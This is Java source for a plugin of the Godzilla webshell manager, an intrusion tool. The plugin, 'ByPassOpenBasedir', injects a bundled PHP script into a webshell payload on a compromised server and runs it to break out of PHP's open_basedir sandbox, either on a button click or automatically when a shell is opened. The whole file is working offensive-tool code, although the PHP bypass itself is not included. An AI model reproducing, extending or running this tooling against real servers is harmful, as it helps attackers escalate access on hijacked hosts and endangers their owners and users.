package net.BeichenDream.Godzilla.shells.plugins.php;

import net.BeichenDream.Godzilla.core.Db;
import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PluginAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.imp.Plugin;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.automaticBindClick;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PluginAnnotation(Name = "ByPassOpenBasedir", payloadName = "PhpDynamicPayload")
public class ByPassOpenBasedir implements Plugin {
    private static final String APP_ENV_KEY = "AutoExecByPassOpenBasedir";
    private static final String CLASS_NAME = "plugin.ByPassOpenBasedir";
    private JCheckBox autoExec = new JCheckBox("autoExec");
    private JButton bybassButton = new JButton("ByPassOpenBasedir");
    private Encoding encoding;
    private boolean loadState;
    private JPanel panel = new JPanel();
    private Payload payload;
    private ShellEntity shell;

    public ByPassOpenBasedir() {
        this.autoExec.setSelected("true".equals(Db.getSetingValue(APP_ENV_KEY)));
        this.autoExec.addActionListener(new ActionListener() {
            /* class shells.plugins.php.ByPassOpenBasedir.AnonymousClass1 */

            public void actionPerformed(ActionEvent paramActionEvent) {
                Db.updateSetingKV(ByPassOpenBasedir.APP_ENV_KEY, Boolean.toString(ByPassOpenBasedir.this.autoExec.isSelected()));
            }
        });
        this.panel.add(this.bybassButton);
        this.panel.add(this.autoExec);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/ByPassOpenBasedir.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.log("Load fail", new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void bybassButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            load();
        }
        if (this.loadState) {
            String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter()));
            Log.log(resultString, new Object[0]);
            JOptionPane.showMessageDialog(this.shell.getFrame(), resultString, "提示", 1);
            return;
        }
        Log.error("load ByPassOpenBasedir fail!");
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity arg0) {
        this.shell = arg0;
        this.payload = arg0.getPayloadModel();
        this.encoding = Encoding.getEncoding(arg0);
        if (this.autoExec.isSelected()) {
            bybassButtonClick(null);
        }
    }
}
